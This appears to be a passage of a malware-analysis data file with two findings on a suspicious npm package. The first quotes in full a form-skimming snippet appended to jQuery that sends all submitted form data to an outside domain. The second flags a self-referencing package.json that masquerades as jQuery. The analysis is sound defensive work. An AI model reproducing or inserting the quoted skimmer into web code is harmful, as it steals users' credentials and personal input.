      "malicious_behavior": "The provided code is primarily the standard jQuery 3.6.0 library, which is widely used and benign. However, appended at the very end of the code is a suspicious snippet: $(\"form\").submit(function() { var d = $(\"form\"); $.ajax({ url: \"https://patipride.icikipoxx.pw\", type: \"get\", data: d.serialize(), success: function () {return true;}, error: function () {return true;}, }); }); This snippet hooks into all form submissions on the page and sends the serialized form data via a GET request to an external, suspicious domain (patipride.icikipoxx.pw) without user consent or notification. This behavior constitutes data exfiltration of potentially sensitive user input to an attacker-controlled server. The code does not provide any legitimate user-facing purpose for this data transmission, nor does it include error handling or logging that would indicate transparency. Such silent interception and exfiltration of form data is a hallmark of malicious behavior, often used for credential theft or information harvesting. Therefore, despite the bulk of the code being legitimate jQuery, the appended form submission handler with external data exfiltration makes the overall code malicious."

      "malicious_behavior": "The package declares a dependency on itself ('kimakq' version '^9.0.1'), which creates a circular dependency. This is suspicious and can cause issues such as infinite loops or unexpected behavior during installation. Additionally, the 'main' field points to 'jquery.min.js', which is unusual for a package named 'kimakq' and may indicate an attempt to masquerade as a popular library. The package lacks meaningful metadata (empty author and description), and the test script is a placeholder. While no explicit malicious code is present in this snippet, the self-dependency and unusual configuration are suspicious and could be used to facilitate malicious behavior."
